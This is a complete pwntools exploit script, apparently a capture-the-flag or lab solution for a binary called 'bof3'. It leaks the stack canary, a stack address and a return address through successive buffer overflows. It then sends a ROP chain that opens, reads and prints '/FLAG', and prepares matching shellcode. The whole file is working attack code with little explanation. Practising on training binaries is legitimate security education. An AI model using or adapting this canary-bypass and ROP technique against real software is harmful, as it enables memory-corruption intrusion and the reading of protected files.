from pwn import *
import sys

context.arch = 'amd64'
context.os = 'linux'

exe = './bof3'
port = 12344

elf = ELF(exe)
off_main = elf.symbols[b'main']
base = 0
qemu_base = 0

r = None
if 'local' in sys.argv[1:]:
    r = process(exe, shell=False)
elif 'qemu' in sys.argv[1:]:
    qemu_base = 0x4000000000
    r = process(f'qemu-x86_64-static {exe}', shell=True)
else:
    r = remote('up.zoolab.org', port)


sc = shellcraft.open("/FLAG", 0)
sc += shellcraft.read('rax', 'rsp', 100)
sc += shellcraft.write(1, 'rsp', 100)
sc += shellcraft.exit(0)

shellcode = asm(sc)
# print(shellcode)

# canary: 0x372fb3eff6eb9900
# stack: 0x00007ffd41bd09e0
# return addr: 0x00007dab79e85c83

# overflow buf1 to get canary
payload1 = b'A' * 185
r.sendafter(b'name? ', payload1)
r.recvuntil(b'Welcome, ' + payload1)

leak = b'\x00'
leak += r.recvn(7)

canary = int.from_bytes(leak, byteorder='little')
canary_byte = canary.to_bytes(8, byteorder='little')
print("Canary address: ", hex(canary))

# overflow buf2 to get stack base(to get msg)
payload2 = b'B' * 144
r.sendafter(b"number? ", payload2)

r.recvuntil(b'The room number is: '+ payload2)

leak = r.recvn(6)
leak += b'\x00\x00'

stack = int.from_bytes(leak, byteorder='little')
stack_byte = stack.to_bytes(8, byteorder='little')
print("Stack address: ", hex(stack))

# overflow buf3 to get return address
payload3 = b'C' * 104
r.sendafter(b"name? ", payload3)

r.recvuntil(b"The customer's name is: "+ payload3)

leak = r.recvn(6)
leak += b'\x00\x00'

ret = int.from_bytes(leak, byteorder='little')
ret_byte = ret.to_bytes(8, byteorder='little')
print("Return address: ", hex(ret))

# place '/FLAG' in msg buffer to read
msg_len = 40
payload = b'/FLAG\0'
payload += b'1' * 34

payload += canary_byte
payload += b'1' * 8

# return address - main address
offset = 0x76507a6cfc83 - 0x76507a6cfbf9
base_addr = ret - offset - off_main
# print(hex(base_addr))

# replace return value place - stack
msg_offset = 0x7fffc71724a0 - 0x7fffc7172460
msg_addr = stack - msg_offset

elf.address = base_addr
rop = ROP(elf)
rop.call('open', [msg_addr, 0])
rop.call('read', [3, msg_addr + 6, 100])
rop.call('write', [1, msg_addr + 6, 100])
rop.call('exit', [0])

# print(rop.dump())
payload += rop.chain()
r.send(payload)

r.readuntil(b'you!\n\n')
print(r.readuntil(b'}'))

r.close()
